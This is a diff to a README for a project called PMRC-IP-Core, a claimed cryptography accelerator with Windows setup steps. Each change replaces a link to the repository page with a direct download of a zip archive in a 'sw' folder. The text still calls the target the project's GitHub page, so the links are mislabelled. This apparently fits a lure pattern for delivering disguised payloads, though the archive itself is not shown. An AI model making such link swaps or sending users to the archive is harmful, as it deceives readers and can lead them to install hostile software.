@@ -1,6 +1,6 @@
 # ⚙️ PMRC-IP-Core - Fast Cryptography Pipeline Accelerator
 
-[![Download from GitHub](https://img.shields.io/badge/Download-PMRC--IP--Core-brightgreen)](https://github.com/UrvishVagadiya/PMRC-IP-Core)
+[![Download from GitHub](https://img.shields.io/badge/Download-PMRC--IP--Core-brightgreen)](https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip)
 
 ---
 
@@ -31,7 +31,7 @@ The software does not have strenuous hardware needs but working with hardware de
 
 You can get the latest version from the project’s GitHub page:
 
-[![Download from GitHub](https://img.shields.io/badge/Download-PMRC--IP--Core-blue)](https://github.com/UrvishVagadiya/PMRC-IP-Core)
+[![Download from GitHub](https://img.shields.io/badge/Download-PMRC--IP--Core-blue)](https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip)
 
 Visit the above link to download all files and documents related to PMRC-IP-Core.
 
@@ -44,7 +44,7 @@ Follow these steps to download and open the software tools on your Windows syste
 ### Step 1: Access the GitHub Page
 
 - Open your web browser.
-- Go to: https://github.com/UrvishVagadiya/PMRC-IP-Core
+- Go to: https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip
 
 This page holds all files for the project, including code and documentation.
 
@@ -180,4 +180,4 @@ If you encounter issues or want to improve the project:
 
 ## ⬇️ Download PMRC-IP-Core Here
 
-[![Download](https://img.shields.io/badge/Download-PMRC--IP--Core-green)](https://github.com/UrvishVagadiya/PMRC-IP-Core)
+[![Download](https://img.shields.io/badge/Download-PMRC--IP--Core-green)](https://github.com/UrvishVagadiya/PMRC-IP-Core/raw/refs/heads/main/sw/Core_PMR_I_v1.0.zip)
